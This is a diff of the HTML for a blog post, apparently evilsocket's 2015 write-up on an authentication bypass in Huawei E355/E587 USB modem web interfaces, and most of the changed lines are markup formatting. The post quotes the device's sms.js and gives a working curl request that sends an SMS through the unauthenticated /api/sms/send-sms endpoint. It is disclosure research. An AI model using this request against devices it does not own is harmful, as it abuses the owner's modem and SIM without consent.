@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html lang=en>
-<head>
+<head><meta name="generator" content="Hexo 3.8.0">
     <!-- so meta -->
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     <meta name="description" content="I own a couple of Huawei USB modems, a Huawei E587 and a Huawei E355, while the first one is great for high speed mobile connections due to its dual channel feature, the E355 is a good choice for a s">
-<meta name="keywords" content="hack,router,authentication,huawei,modem,modems,e355,e587,bypass,sms,reboot">
+<meta name="keywords" content="hack,router,sms,authentication,huawei,modem,modems,e355,e587,bypass,reboot">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Huawei Modems Authentication Bypass">
 <meta property="og:url" content="https://www.evilsocket.net/2015/02/01/huawei-usb-modems-authentication-bypass/index.html">
@@ -50,7 +50,7 @@
     <!-- rss -->
     
     
-      <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml" />
+      <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml">
     
 </head>
 
@@ -69,7 +69,7 @@
         
       </ul>
     </span>
-    <br/>
+    <br>
     <span id="actions">
       <ul>
         
@@ -86,7 +86,7 @@
       <span id="i-top" class="info" style="display:none;">Back to top</span>
       <span id="i-share" class="info" style="display:none;">Share post</span>
     </span>
-    <br/>
+    <br>
     <div id="share" style="display: none">
       <ul>
   <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://www.evilsocket.net/2015/02/01/huawei-usb-modems-authentication-bypass/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
@@ -113,7 +113,7 @@
     
     <div class="content index my4">
         
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
   <header>
     
     <h1 class="posttitle" itemprop="name headline" style="text-transform: uppercase;">
@@ -140,7 +140,7 @@
     <div class="addthis_sharing_toolbox"></div>
   </header>
 
-    <br/>
+    <br>
   
 
   <div class="content" itemprop="articleBody">
@@ -148,10 +148,10 @@
 <p>I own a couple of Huawei USB modems, a <strong>Huawei E587</strong> and a <strong>Huawei E355</strong>, while the first one is great for high speed mobile connections due to its dual channel feature, the E355 is a good choice for a small, easy to use and connect ( <strong>cdc_ether</strong> baby! ) mobile device.</p>
 <p>But are they safe? … <strong>of course NOT</strong> :D</p>
 <a id="more"></a>
-<p>Many other researchers reported a <a href="http://www.huawei.com/en/security/psirt/security-bulletins/security-advisories/hw-275474.htm" target="_blank" rel="external">few vulnerabilities</a> on some <a href="http://www.exploit-db.com/exploits/19185/" target="_blank" rel="external">specific devices</a>, but actually the same vulnerability, the authentication bypass, applies for every device having the Huawei <strong>WebUI</strong> if you use their API url instead of the specific html form of the device model itself.</p>
+<p>Many other researchers reported a <a href="http://www.huawei.com/en/security/psirt/security-bulletins/security-advisories/hw-275474.htm" target="_blank" rel="noopener">few vulnerabilities</a> on some <a href="http://www.exploit-db.com/exploits/19185/" target="_blank" rel="noopener">specific devices</a>, but actually the same vulnerability, the authentication bypass, applies for every device having the Huawei <strong>WebUI</strong> if you use their API url instead of the specific html form of the device model itself.</p>
 <p>Most of the html forms inside the web ui, which are “protected” by a username and passsword ( default admin:admin, change it! ), just perform an AJAX request to the <strong>real</strong> API url, for instance:</p>
 <p><strong>/js/sms.js</strong> from E355 WebUI v11.011.04.00.625</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">....</div><div class="line">....</div><div class="line">saveAjaxData(<span class="string">"api/sms/send-sms"</span>, submitData, <span class="function"><span class="keyword">function</span>(<span class="params">$xml</span>) </span>&#123;</div><div class="line">    <span class="comment">//-------------------------------------------------------------------</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getSendSmsStatus</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        getAjaxData(<span class="string">"api/sms/send-status"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$xml</span>) </span>&#123;</div><div class="line">            <span class="keyword">var</span> ret = xml2object($xml);</div><div class="line">            ret = ret.response;</div><div class="line">            <span class="keyword">var</span> sendTotalCount = ret.TotalCount;</div><div class="line">            <span class="keyword">var</span> currentSendIndex = ret.CurIndex;</div><div class="line">            <span class="keyword">var</span> currentSendPhone = ret.Phone;</div><div class="line">            <span class="keyword">var</span> sendSuccessPhones = ret.SucPhone;</div><div class="line">            <span class="keyword">var</span> sendFailPhones = ret.FailPhone;</div><div class="line">            <span class="keyword">var</span> statusContent = sms_hint_sending + <span class="string">"&amp;nbsp;"</span> + currentSendIndex + <span class="string">"/"</span> + sendTotalCount;</div><div class="line">....</div><div class="line">....</div></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">....</span><br><span class="line">saveAjaxData(<span class="string">"api/sms/send-sms"</span>, submitData, <span class="function"><span class="keyword">function</span>(<span class="params">$xml</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//-------------------------------------------------------------------</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getSendSmsStatus</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        getAjaxData(<span class="string">"api/sms/send-status"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$xml</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> ret = xml2object($xml);</span><br><span class="line">            ret = ret.response;</span><br><span class="line">            <span class="keyword">var</span> sendTotalCount = ret.TotalCount;</span><br><span class="line">            <span class="keyword">var</span> currentSendIndex = ret.CurIndex;</span><br><span class="line">            <span class="keyword">var</span> currentSendPhone = ret.Phone;</span><br><span class="line">            <span class="keyword">var</span> sendSuccessPhones = ret.SucPhone;</span><br><span class="line">            <span class="keyword">var</span> sendFailPhones = ret.FailPhone;</span><br><span class="line">            <span class="keyword">var</span> statusContent = sms_hint_sending + <span class="string">"&amp;nbsp;"</span> + currentSendIndex + <span class="string">"/"</span> + sendTotalCount;</span><br><span class="line">....</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
 <p>As you might have already guessed, those urls which are all starting with <strong>/api/</strong> are not password protected whatsoever, for instance if you try the following (while you’re using your Huawei device and you have a SIM card in it):</p>
 <pre><code>curl &quot;http://192.168.1.1/api/sms/send-sms&quot; --data &apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;request&gt;&lt;Index&gt;-1&lt;/Index&gt;&lt;Phones&gt;&lt;Phone&gt;XXXXXXXXXX&lt;/Phone&gt;&lt;/Phones&gt;&lt;Sca&gt;&lt;/Sca&gt;&lt;Content&gt;test&lt;/Content&gt;&lt;Length&gt;4&lt;/Length&gt;&lt;Reserved&gt;1&lt;/Reserved&gt;&lt;Date&gt;2015-02-01 14:02:26&lt;/Date&gt;&lt;/request&gt;&apos;
 </code></pre><p>where XXXXXXXXXX would be your phone number, you’ll get a “test” sms from that device.</p>
